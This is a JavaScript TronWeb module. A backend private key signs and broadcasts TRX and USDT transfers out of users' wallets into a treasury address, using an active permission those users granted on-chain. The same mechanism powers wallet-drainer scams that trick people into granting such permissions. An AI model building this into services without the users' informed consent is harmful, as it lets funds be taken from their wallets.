import TronWebModule from "tronweb";
import { config } from "./config.js";

const TronWeb = TronWebModule.TronWeb || TronWebModule.default?.TronWeb;
const tronWeb = new TronWeb({
  fullHost: config.fullNode,
  solidityNode: config.solidityNode,
  eventServer: config.eventServer,
});

/**
 * Get backend signer address from private key.
 */
export function getBackendAddress() {
  if (!config.backendPrivateKey || config.backendPrivateKey === "YOUR_BACKEND_PRIVATE_KEY") {
    return null;
  }
  const addr = tronWeb.address.fromPrivateKey(config.backendPrivateKey);
  return tronWeb.address.fromHex(addr);
}

/**
 * Get account permissions from chain and find active permission by name.
 */
export async function findPermissionIdByName(accountAddress, permissionName) {
  const acc = await tronWeb.trx.getAccount(accountAddress);
  const actives = acc.active_permission || [];
  const name = (permissionName || config.activePermissionName).toLowerCase();
  for (const p of actives) {
    const pName = (p.permission_name || "").toLowerCase();
    if (pName === name && p.id != null) {
      return p.id;
    }
  }
  return null;
}

/**
 * Build, sign (with permission_id), and broadcast TRX transfer from user to treasury.
 * Uses multiSign so the backend key signs with the user's active permission (permissionId).
 */
export async function sendTrxFromUser(userAddress, toAddress, amountSun, permissionId) {
  const fromHex = tronWeb.address.toHex(userAddress);
  const toBase58 = toAddress || config.treasuryAddress;
  const toHex = tronWeb.address.toHex(toBase58);
  const tx = await tronWeb.transactionBuilder.sendTrx(toHex, Number(amountSun), fromHex);
  const signed = await tronWeb.trx.multiSign(tx, config.backendPrivateKey, permissionId);
  const result = await tronWeb.trx.sendRawTransaction(signed);
  return result;
}

/**
 * Build, sign (with permission_id), and broadcast USDT transfer from user to treasury.
 * Uses multiSign so the backend key signs with the user's active permission (permissionId).
 */
export async function sendUsdtFromUser(userAddress, toAddress, amountSun, permissionId) {
  const fromHex = tronWeb.address.toHex(userAddress);
  const toBase58 = toAddress || config.treasuryAddress;
  const toHex = tronWeb.address.toHex(toBase58);
  const functionSelector = "transfer(address,uint256)";
  const parameter = [
    { type: "address", value: toHex },
    { type: "uint256", value: String(amountSun) },
  ];
  const tx = await tronWeb.transactionBuilder.triggerSmartContractFunction(
    config.usdtContract,
    functionSelector,
    { feeLimit: 100_000_000 },
    parameter,
    fromHex
  );
  if (!tx.result?.result) {
    throw new Error(tx.result?.result === false ? "Trigger failed" : "Build failed");
  }
  const signed = await tronWeb.trx.multiSign(tx.transaction, config.backendPrivateKey, permissionId);
  const result = await tronWeb.trx.sendRawTransaction(signed);
  return result;
}

export { tronWeb };
